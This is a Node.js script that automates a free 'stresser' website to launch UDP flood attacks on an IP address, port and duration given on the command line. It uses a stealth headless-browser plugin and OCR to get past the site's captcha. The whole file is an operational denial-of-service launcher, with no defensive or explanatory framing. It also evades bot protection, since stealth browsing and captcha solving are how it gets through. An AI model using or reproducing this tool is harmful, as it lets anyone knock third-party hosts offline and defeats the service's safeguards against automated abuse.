"use strict";

// Dependencies
const puppeteerStealth = require("puppeteer-extra-plugin-stealth")
const { PythonShell } = require("python-shell")
const puppeteer = require("puppeteer-extra")
const isIP = require("is-ip")

// Variables
const args = process.argv.slice(2)

var FSWCBypasser = {}

// Configurations
/// Puppeteer
puppeteer.default.use(puppeteerStealth())

// Functions
FSWCBypasser.bypassCaptcha = async function(){
    return new Promise((resolve) =>{
        PythonShell.run("./utils/image_reader.py", null, function(err, result){
            if(err){
                console.log(`Python error detected: ${err}`)
                process.exit()
            }

            setTimeout(function(){
                resolve(result[0])
            }, 1000)
        })
    })
}

FSWCBypasser.removeAdvertisement = async function(page){
    await page.waitForSelector("#ads > div > div > div.modal-header > button").catch(()=>{
        return
    })

    return new Promise(async(resolve, reject)=>{
        await page.evaluate(()=>{
            const exit = document.querySelector("#ads > div > div > div.modal-header > button")

            exit.click()
        })

        resolve()
    })
}

FSWCBypasser.main = async function(){
    const browser = await puppeteer.default.launch({ headless: false, argv: ["--no-sandbox", "--disable-setuid-sandbox"] })
    const page = await browser.newPage()
    
    await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36")
    await page.setViewport({
        width: 800,
        height: 1000
    })

    await page.goto("https://freestresser.to/", { waitUntil: "networkidle0", timeout: 0 })

    const page_content = await page.content()

    if(page_content.indexOf("Ratelimited for another -8 seconds") != -1){
        console.log("You have been limited, please try again later.")
        await browser.close()
        process.exit()
    }

    console.log("[Processing] Checking & closing any advertisements.")
    await FSWCBypasser.removeAdvertisement(page)
    console.log("[Finished] Checking & closing any advertisements")

    await page.screenshot({
        path: "image.png",
        clip: {
            x: 250,
            y: 350,
            width: 100,
            height: 100
        }
    })

    console.log("[Processing] Reading the captcha codes, for bypassing.")
    var code = await FSWCBypasser.bypassCaptcha()
    console.log("[Finished] Reading the captcha codes, for bypassing.")

    if(!code.match(/[0-9]{4,}/)){
        console.log("Unable to get the code, something is wrong please try again.")
        await browser.close()
        process.exit()
    }

    code = code.match(/[0-9]{5,}/)[0]

    console.log(`Captcha code found ${code}`)

    await page.type("#host", args[0])
    await page.type("#port", args[1])
    await page.type("#time", args[2])
    await page.type("#captcha", code)
    await page.click("#send")

    await page.waitForSelector("#flood_result").then(async()=>{
        const page_content = await page.content()

        if(page_content.indexOf("Operation Failed Error contacting ajax script, please check your connection and try again. Sometimes refreshing the page solves this problem") != -1){
            console.log("It looks like your internet is slow, please try again later.")
            await browser.close()
            process.exit()
        }

        if(page_content.indexOf("Operation Successful UDP was sent to") != -1){
            console.log(`Stressing to ${args[0]} has started and will end in ${args[2]} seconds.`)
            await browser.close()
            process.exit()
        }

        if(page_content.indexOf("Operation Failed Doing some updates on the stresser") != -1){
            console.log("FreeStresser is doing some updates, please try again later.")
            await browser.close()
            process.exit()
        }else{
            console.log("There is something going on, on FreeStresser please try again later.")
            await browser.close()
            process.exit()
        }
    }).catch(async()=>{
        console.log("It looks like your internet is slow, please try again later.")
        await browser.close()
        process.exit()
    })
}

//Main
if(!args.length) return console.log("node index.js <ip> <port> <seconds>")
if(!args[0]) return console.log("Invalid ip.")
if(!isIP(args[0])) return console.log("Invalid ip.")
if(!args[1]) return console.log("Invalid port.")
if(!args[2]) return console.log("Invalid seconds.")
if(args[2] > 60) return console.log("Invalid seconds, maximum is 60.")

FSWCBypasser.main()